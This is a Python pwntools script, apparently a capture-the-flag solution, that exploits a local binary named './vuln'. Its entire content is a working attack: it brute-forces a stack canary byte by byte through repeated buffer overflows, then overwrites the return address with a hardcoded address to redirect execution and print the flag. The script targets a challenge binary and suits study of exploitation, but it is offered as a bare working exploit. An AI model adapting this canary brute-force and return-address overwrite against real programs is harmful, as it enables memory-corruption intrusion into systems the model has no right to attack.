from pwn import *

context.log_level = 'error'

def find_canary():
    canary = ''

    for byte in range(0, 4):
        for x in range(0, 0x100):
            p = process('./vuln')
            payload = 'a' * 0x20 + canary + chr(x)

            p.recvuntil('Please enter the length of the entry:\n> ')
            p.sendline(str(len(payload)))

            p.recvuntil('Input> ')
            p.sendline(payload)

            line = p.recvline()
            p.kill()

            #print hex(x) + ': ' + line

            if 'Flag' in line:
                canary += chr(x)
                break

    return u32(canary)

def get_flag(canary):
    lucky_addr = 0x565d67ed     #Took this from gdb, we rely on this address being used again by PIE
    payload = 'a' * 0x20 + p32(canary) + 'a' * 0x10 + p32(lucky_addr)
    flag = ''
    solved = False

    while not solved:
        p = process('./vuln')

        p.sendline(str(len(payload)))
        p.sendline(payload)
        lines = p.recvall().strip().splitlines()
        p.kill()
        if "Ok... Now Where's the Flag?" not in lines[-1]:
            solved = True
            flag = lines[-1]

    return flag


if __name__ == '__main__':
    print 'Finding canary...'
    canary = find_canary()
    print 'Canary: {}'.format(hex(canary)) #0x48676a4c

    print 'Working for that flag...'
    flag = get_flag(canary)
    print 'Flag: ' + flag
